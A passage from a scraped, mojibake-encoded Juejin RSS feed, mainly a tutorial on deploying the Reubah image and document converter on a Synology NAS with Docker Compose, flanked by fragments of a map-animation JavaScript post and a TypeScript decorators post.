            // å¼€å§‹ç¬¬ä¸€æ¬¡ç§»åŠ¨
            if (currentPath.length &gt; 1) {
                isAnimating = true;
                marker.moveAlong(currentPath, {
                    duration: 500,
                    autoRotation: true,
                });
            }
            
            // æ¯3ç§’åŠ è½½ä¸€æ¬¡æ–°æ•°æ®
            loadInterval = setInterval(function() {
                loadTrajectoryPoints();
            }, 3000);
        });

        map.setFitView();
    });
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€NASã€å›¾ç‰‡å’Œæ–‡æ¡£æ ¼å¼è½¬æ¢å·¥å…·-Reubah]]></title>    <link>https://juejin.cn/post/7596883689827811391</link>    <guid>https://juejin.cn/post/7596883689827811391</guid>    <pubDate>2026-01-19T17:45:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827811391" data-draft-id="7596934200580653092" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€NASã€å›¾ç‰‡å’Œæ–‡æ¡£æ ¼å¼è½¬æ¢å·¥å…·-Reubah"/> <meta itemprop="keywords" content="å‰ç«¯,Docker"/> <meta itemprop="datePublished" content="2026-01-19T17:45:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾·è‚²å¤„ä¸»ä»»"/> <meta itemprop="url" content="https://juejin.cn/user/2673620576140030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€NASã€å›¾ç‰‡å’Œæ–‡æ¡£æ ¼å¼è½¬æ¢å·¥å…·-Reubah
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2673620576140030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾·è‚²å¤„ä¸»ä»»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:45:45.000Z" title="Mon Jan 19 2026 17:45:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p>
<blockquote>
<p>æ•´ç†äº†ä¸€ä¸ªNASå°ä¸“æ ï¼Œæœ‰å…´è¶£çš„å·¥å‹å¯ä»¥å…³æ³¨ä¸€ä¸‹ ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4251932893636722695%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4251932893636722695#wechat_redirect" ref="nofollow noopener noreferrer">ã€ŠNASé‚ªä¿®ã€‹</a></p>
</blockquote>
<p>Reubah æ˜¯ä¸€æ¬¾åŸºäºç½‘é¡µçš„å·¥å…·ï¼Œå…·å¤‡å›¾ç‰‡æ ¼å¼è½¬æ¢ã€ä¼˜åŒ–ã€æ‰¹é‡å¤„ç†ï¼ˆèƒŒæ™¯ç§»é™¤å³å°†æ¨å‡ºï¼‰å’Œå¤šç§æ–‡æ¡£æ ¼å¼è½¬æ¢åŠŸèƒ½ï¼Œæ”¯æŒæš—é»‘æ¨¡å¼ä¸ APIï¼Œæ— æ–‡ä»¶å­˜å‚¨ä¸”è‡ªåŠ¨æ¸…ç†ï¼Œå¯é€šè¿‡ Docker æˆ–æœ¬åœ°éƒ¨ç½²ï¼Œç•Œé¢ç®€æ´æ˜“ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/011df7c583a641439a43488b7117ee99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=PHpG5RyccssM5VpWJl3sjyA7JLc%3D" alt="01.png" loading="lazy"/></p>
<p>æœ¬æ¬¡ä½¿ç”¨çš„æ˜¯ç¾¤æ™– NAS éƒ¨ç½² Reubahï¼Œå…¶ä»–å“ç‰Œçš„ NAS æ“ä½œæ­¥éª¤ç±»ä¼¼ã€‚</p>
<p>é¦–å…ˆåœ¨â€œFile Stationâ€é‡Œæ‰¾åˆ°â€œdockerâ€æ–‡ä»¶å¤¹ï¼Œåœ¨â€œdockerâ€æ–‡ä»¶å¤¹é‡Œåˆ›å»ºâ€œreubahâ€æ–‡ä»¶å¤¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/971c3c4c4a5a459dba90080c2f962441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=Mt3BQ6vtdFODl7eS9llwHRu7Je4%3D" alt="02.png" loading="lazy"/></p>
<p>æ‰“å¼€â€œContainer Managerâ€ï¼Œæ–°å¢ä¸€ä¸ªé¡¹ç›®ã€‚</p>
<p>é¡¹ç›®åç§°å¡« <code>reubah</code>ã€‚</p>
<p>è·¯å¾„é€‰æ‹©åˆšåˆšåœ¨â€œdockerâ€æ–‡ä»¶å¤¹é‡Œåˆ›å»ºçš„â€œreubahâ€ã€‚</p>
<p>æ¥æºé€‰æ‹©â€œåˆ›å»º docker-mompose.ymlâ€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a176253c58454def9f19d44a895a187b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=%2F%2F44Spieo0szajoMfBLSaX6Ljx0%3D" alt="03.png" loading="lazy"/></p>
<p>ç„¶åå¡«å…¥ä»¥ä¸‹ä»£ç ï¼ˆéœ€è¦æ³¨æ„ä»£ç æ ¼å¼ï¼Œç©ºæ ¼å’Œæ¢è¡Œè¿™äº›ï¼‰ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">services:</span>
  <span class="hljs-attr">reubah:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">ghcr.io/dendianugerah/reubah:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">reubah</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8081:8081"</span>
    <span class="hljs-attr">security_opt:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-literal">no</span><span class="hljs-string">-new-privileges:true</span>
    <span class="hljs-attr">cap_drop:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">ALL</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
</code></pre>
<p><code>8081:8081</code> è¿™å¥ï¼Œå†’å·å·¦ä¾§çš„æ•°å­—æ˜¯å¯ä»¥æ”¹çš„ï¼Œå³ä¾§é‚£ä¸ªä¸èƒ½æ”¹ã€‚</p>
<p>è¾“å…¥å®Œä»£ç åç‚¹å‡»â€œä¸‹ä¸€æ­¥â€ã€‚</p>
<p>å‹¾é€‰â€œé€šè¿‡ Web Station è®¾ç½®ç½‘é¡µé—¨æˆ·â€ï¼Œç„¶åç‚¹å‡»â€œä¸‹ä¸€æ­¥â€ï¼Œç­‰å¾… docker ä¸‹è½½ç›¸å…³ä»£ç ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d01971a81daf48a0b2eb7168dee16801~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=hM%2BGF%2BvQvlxDwaQ0dwAkk42%2FZr4%3D" alt="04.png" loading="lazy"/></p>
<p>æœ€åä¸€æ­¥æ˜¯æ‰“å¼€â€œWeb Stationâ€ï¼ˆæ²¡æœ‰è¿™ä¸ªå·¥å…·å°±å»â€œå¥—ä»¶ä¸­å¿ƒâ€ä¸‹è½½ï¼‰ã€‚</p>
<p>æ–°å¢ä¸€ä¸ªç½‘ç»œé—¨æˆ·ï¼Œå‚è€ƒä¸‹å›¾é€‰é¡¹ã€‚</p>
<p>éœ€è¦æ³¨æ„ï¼Œç«¯å£è¦è¾“å…¥ä¸€ä¸ªå’Œå…¶ä»–é¡¹ç›®ä¸å†²çªçš„æ•°å­—ï¼Œæˆ‘è¿™é‡Œè¾“å…¥çš„æ˜¯ <code>2347</code>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfb7fea273484c14b275360fc733f33e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=Jn0S2nDef7Nkqrs7Ykq6whOKKhg%3D" alt="05.png" loading="lazy"/></p>
<p>å®Œæˆä¸Šé¢æ‰€æœ‰æ“ä½œåï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€ <code>NASçš„IP + reubahç«¯å£å·</code> å°±å¯ä»¥è®¿é—® Rebuah äº†ã€‚</p>
<p>æ¯”å¦‚æˆ‘çš„æ˜¯ <code>http://192.168.31.85:2347</code>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67a941b24dd34d12b3bcc06c54754030~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=u%2Bk9T7DPppwtzBQ3OKvXJq8A6JE%3D" alt="06.png" loading="lazy"/></p>
<p>åœ¨å›¾ç‰‡æ ¼å¼è½¬æ¢è¿™è¾¹ï¼Œè¿˜æ”¯æŒ iPhone çš„å®å†µç…§ç‰‡æ ¼å¼ï¼ˆHEICï¼‰è½¬æ¢ã€‚</p>
<p>å¸¸è§çš„ jpegã€pngã€webpã€gifã€bmp ä»¥åŠå°†å›¾ç‰‡è½¬æ¢æˆ pdf éƒ½æ˜¯æ”¯æŒçš„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87e6736a0c004730b486abe22d23392c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=DfpFi2sFrPszx%2F97zhsu15ra6jE%3D" alt="07.png" loading="lazy"/></p>
<p>æ–‡ä»¶æ ¼å¼è¿™è¾¹åŒ…å«å¸¸è§çš„pdfã€docxã€docã€odtã€txt å’Œ rtfã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6043ec0ed47c4bbeb9550bc1177bed4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=OfkKNWx19MmjfkPIGAzOaIfM%2B1Y%3D" alt="08.png" loading="lazy"/></p>
<p>åˆ‡æ¢åˆ° Batch Processing é¢æ¿è¿˜å¯ä»¥åšæ‰¹é‡å¤„ç†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679f27fb544a4b2b8fad743cc575067e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449544&amp;x-signature=OLgiu4EWXg7lG85od9y7C%2FV8hgs%3D" alt="09.png" loading="lazy"/></p>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯æœ¬æ–‡çš„å…¨éƒ¨å†…å®¹å•¦ï¼Œæƒ³äº†è§£æ›´å¤šNASç©æ³•å¯ä»¥å…³æ³¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4251932893636722695%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4251932893636722695#wechat_redirect" ref="nofollow noopener noreferrer">ã€ŠNASé‚ªä¿®ã€‹</a></p>
<p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TS@è£…é¥°å™¨ä½¿ç”¨å’ŒåŸç†]]></title>    <link>https://juejin.cn/post/7596906923892686858</link>    <guid>https://juejin.cn/post/7596906923892686858</guid>    <pubDate>2026-01-19T17:53:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892686858" data-draft-id="7591705084671197222" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TS@è£…é¥°å™¨ä½¿ç”¨å’ŒåŸç†"/> <meta itemprop="keywords" content="å‰ç«¯,TypeScript"/> <meta itemprop="datePublished" content="2026-01-19T17:53:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LaLu"/> <meta itemprop="url" content="https://juejin.cn/user/739350236891191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TS@è£…é¥°å™¨ä½¿ç”¨å’ŒåŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/739350236891191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LaLu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:53:36.000Z" title="Mon Jan 19 2026 17:53:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1ã€è£…é¥°å™¨</h2>
<blockquote>
